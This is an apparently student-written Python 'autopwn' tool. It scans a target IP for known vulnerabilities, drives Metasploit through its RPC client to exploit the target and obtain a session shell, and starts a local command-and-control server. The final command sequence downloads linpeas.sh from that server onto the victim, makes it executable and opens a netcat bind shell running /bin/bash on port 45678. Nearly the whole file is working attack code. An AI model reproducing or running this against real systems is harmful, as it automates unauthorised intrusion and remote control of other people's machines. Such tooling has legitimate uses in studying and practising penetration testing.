#!/usr/bin/python3

from os import path
import subprocess
import pprint
import json
from capstone import CS_OP_IMM

from netaddr import P
import autopayload
from pymetasploit3.msfrpc import MsfRpcClient
import time
from logs import LOG
import post.postexploit as postexploit
import sys

RED = "\033[1;31m"
YELLOW = "\033[33m"
BLUE = "\033[1;34m"
CYAN = "\033[1;36m"
GREEN = "\033[0;32m"
RESET = "\033[0;0m"
BOLD = "\033[;1m"
REVERSE = "\033[;7m"

LOW = "Low"
MEDIUM = BLUE + "Medium" + RESET
HIGH = YELLOW + "High" + RESET
CRITICAL = RED + "Critical" + RESET

SEVERITY_TEXT = {"LOW": LOW, "MEDIUM": MEDIUM, "HIGH": HIGH, "CRITICAL": CRITICAL}


logfile = open("./logtest", "a+")

LOG("Launched autopwn.", logfile, "inf")

IP = "192.168.1.45"
EXPLOIT_LIST = "./exploit_list"


def show_pwnguin():
    """Displays pwngin ASCII art logo, nothing useful"""
    print(
        f"""
                                            (#(
                                        @@@/#&@&
                                  (&@@@,#&&@@&&&&&&&@@(
                             #@@@( %&&&&&&&@@@@@@@@@@
                         ,@@%/&&&&@@@@@@@@@@@@@@@@@@@@,
                       @@@&&&&@@@@@@@@@@@@@@@@@@@@@@@@@@&
                    ,@@&&&&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
                   @@@&&@@&@#,,&@@@@@@@@@@@@@@@@%**%@@@@@@@@&
                 #@@@@@@%          %@@@@@@@@(          @@@@@@@,
                @@@@@@@   @@&        (@@@@,        @@&  /@@@@@@&
               @@@@@@@.    ,%@{RED}@@{RESET}&,     %     /@{RED}@@{RESET}@(,    #@@@@@@&
              @@@@@@@@    ..@@{RED}&..{RESET}@@@.    #@@{RED}@...@{RESET}@@,     @@@@@@@#
             &@@@@@@@@      {BLUE},@@@@@@{RESET}  .{YELLOW}%({RESET}  {BLUE}./@@@@@@,{RESET}      @@@@@@@@/
            /@@#&@@@@@            ,@{YELLOW}@&.  /@{RESET}@@            @@@@@&%@@
            @@/&&#@@@@@          @@{YELLOW}((/,*///%{RESET}@%          @@@@@%&&#@@
           .@&%@&@,@@@@@         .,/@{YELLOW}@/(((@{RESET}@,.          @@@@@.&&@#@@
           ,@(@@@&&,/@@@@.         ...{YELLOW}%@@/{RESET},.          ,@@@@,(&@@@&&@.
            """
    )


def scanIp4Vulnerabilities(exploit_path=EXPLOIT_LIST, ip=IP):
    """Scans IP loofing for vulnerabilities and output the
    related exploit list to be parsed (in json)
    """
    cmd = "./explookup.sh " + ip + " >> /dev/null"
    scan = subprocess.run(cmd, shell=True)
    if scan:
        msg = "Launching scan over @" + ip + " cmd :" + cmd
        print("[i] Launching scan over @" + ip + " cmd :" + cmd)
        LOG(msg, logfile, "log")
    else:
        LOG("Error 1 : nmap failed.", logfile, "err")
        print("[X] Error 1 : nmap failed.")
        exit(-1)
    with open(exploit_path, "r+") as f:
        result = json.loads(f.read())
    return result

def getEdbExploit(res=[]):
    edbExploits=[]
    for search in res:
        edbExploits+=search["RESULTS_EXPLOIT"]

    paths =[]
    if edbExploits:
        paths = [pwn["Path"] for pwn in edbExploits]
    
    if paths:
        k=0
        for path in paths:
            command = "cp " + path + " ./edb/exploit_" + str(k)
            print(command)
            subprocess.run(command,shell=True)
            k+=1
    pprint.pprint(paths)


def createExploitList(res=[]) -> tuple[list[str],list[str]]:
    """Create exploits / metasploits lists from the list of research
    returns (titles, metaexploits)
    """
    exploits = []
    for search in res:
        exploits += search["RESULTS_EXPLOIT"]
    LOG("Imported exploit_list", logfile, "log")
    if exploits:
        titles = [pwn["Title"] for pwn in exploits]
        noDuplicattes = []
        [noDuplicattes.append(i) for i in titles if not noDuplicattes.count(i)]
        titles = noDuplicattes
        titles = [[k, title] for k, title in enumerate(titles)]
    else:
        LOG("Error 2 : Parsing error.", logfile, "err")
        print("[X] Error 2 : Parsing error.")
        exit(-2)
    LOG("Parsed ./exploit_list", logfile, "log")
    metaexploits = []
    for j in range(len(titles)):
        if "(Metasploit)" in titles[j][1]:
            metaexploits.append(titles[j])
    return (titles, metaexploits)


def selectExploit(choice=0, titles=[]) -> str:
    return titles[int(choice)][1][:-12]


def runMetasploit(reinit=False, show=True) -> MsfRpcClient:
    """Launch metasploit instance and returns associated client
    It is also possible to reinit the db if reinit = True (must be root!!!)
    """
    redirect = None
    if not show:
        redirect = subprocess.DEVNULL

    proc = subprocess.run(
        "msfrpcd -P yourpassword", shell=True, stdout=redirect, stderr=redirect
    )
    time.sleep(5)
    LOG("Started process msfrpcd", logfile, "inf")

    if reinit:
        proc = subprocess.run(
            "echo yes | msfdb reinit", shell=True, stdout=redirect, stderr=redirect
        )  # if db problem
        LOG("Started process msfdb (arg reinit)", logfile, "inf")

    client = MsfRpcClient("yourpassword", ssl=True)
    print("\n")
    return client


def searchModules(client: MsfRpcClient = None, attack="") -> list[dict]:
    modules = client.modules.search(attack)

    print("[~] Available modules :")
    for k in range(len(modules)):
        pprint.pprint(
            str(k) + " : " + modules[k]["type"] + " : " + modules[k]["fullname"]
        )
    LOG("Displayed modules", logfile, "log")
    return modules


# TODO couper exploitVuln en 3 fonctions select exploit, select payload et exploitVuln
def exploitVuln(client=None, modlist=[]) -> None:
    """Execute selected payload on the targeted"""
    exploit = client.modules.use(modlist[0]["type"], modlist[0]["fullname"])
    print("[V] Selected payloads: ", exploit.info)

    print("Exploit options :")
    print(exploit.options)
    print("\n")

    plds = exploit.targetpayloads()
    print("[~] Available payloads :")
    pprint.pprint(plds)
    print("[-1 for autochosing]")
    pay_idx = int(input("Which payload do you want to use ? :"))

    print("")
    if pay_idx == -1:
        tmp = autopayload.autochose(exploit.targetpayloads())
        if tmp == -1:
            payload = client.modules.use("payload", plds[0])
            print("No usual payload available, reflected to : " + plds[0])
        else:
            payload = client.modules.use("payload", tmp)
            print("Autopayload selected : " + tmp)
    else:
        payload = client.modules.use("payload", plds[pay_idx])
    print("[V] Payload selected !")
    LOG("User selected payload", logfile, "log")
    print("\n")

    for i in payload.missing_required:
        payload[i] = input(i + ": ")

    for i in exploit.missing_required:
        exploit[i] = input(i + ": ")

    print(exploit.execute(payload=payload))

    while len(client.jobs.list) != 0:
        pass


def getShell(client=None, id="1"):
    """Get shell from ID session"""
    LOG("Shell obtained", logfile, "log")
    return client.sessions.session(id)


def autopwn():
    show_pwnguin()

    results = scanIp4Vulnerabilities(EXPLOIT_LIST, IP)
    (exploits, metaexploits) = createExploitList(results)
    getEdbExploit(results)

    print("[~] Generic exploits :")
    if exploits:
        pprint.pprint(exploits)
        print("\n")
    else:
        LOG("Error 3 : No exploit found on Metasploit.", logfile, "err")
        print("[X] Error 3 : No exploit found on Metasploit.")
        exit(-3)
    LOG("Displayed possible exploits to user", logfile, "log")

    print("[~] Metasploit exploits :")
    if metaexploits:
        pprint.pprint(metaexploits)
        print("\n")
    else:
        LOG("Error 3 : No exploit found on Metasploit.", logfile, "err")
        print("[X] Error 3 : No exploit found on Metasploit.")
        exit(-3)
    LOG("Displayed possible exploits to user", logfile, "log")

    choice = input("[~] Please select an exploit: ")
    attack = selectExploit(choice, exploits)

    print("[V] Exploit selected ! :")
    print(attack)
    print("\n")
    LOG("User selected " + attack, logfile, "log")

    print("Starting msfrpcd...")
    client = runMetasploit(False)
    modlist = searchModules(client, attack)
    exploitVuln(client, modlist)

    print(client.sessions.list)
    print("\n")

    shell = getShell(client, "1")

    print("[~] Entering command and control section")
    LOG("Entered in C&C section", logfile, "inf")

    print("[~] Opening local C2 server ...")
    (proc, port) = postexploit.openCtrlSrv("192.168.1.86")
    ipport = "http://192.168.1.86:" + str(port)

    print("[V] Pwn complete !!! ")
    return (shell, client, ipport)


# ,
# "./linpeas.sh -o users_information,software_information"]

# if shell:
#     for command in sequence:
#         print(command)
#         shell.write(command)
#         time.sleep(5) # Todo : modifier le sleep
#         print(shell.read())
#         if(str(shell.read()).isprintable()):
#             print(str(shell.read()))
#         else:
#             print("coucou")


def sendCommands(shell, sequence=[]) -> int:
    """Automated interaction with shell on target"""
    if len(sequence) == 0:
        print("[X] Error 5 : Invalid sequence.")
        LOG("[X] Error 5 : Invalid sequence.", logfile, "err")
        return -5

    # if (shell == None):
    #     print("[X] Error 6 : Invalid shell.")
    #     LOG("[X] Error 6 : Invalid shell.", logfile, "err")
    #     return -6

    for command in sequence:
        print(command)
        shell.write(command)
        time.sleep(5)  # Todo : modifier le sleep
        print(shell.read())
    return 0


if len(sys.argv) > 1:
    IP = sys.argv[1]


(shell, client, srv) = autopwn()

sequence = [
    "whoami",
    "curl -s " + srv + "/post/vir/linpeas.sh -o linpeas.sh > /dev/null",
    "pwd",
    "chown root:root linpeas.sh",
    "echo 0xcafedeadbeef",
    "chmod +x linpeas.sh",
    "echo matthislemechan",
    "nc -l -p 45678 -e /bin/bash"
]

sendCommands(shell, sequence)

LOG("END OF LOGS", logfile, "crit")
logfile.close()

exit(0)
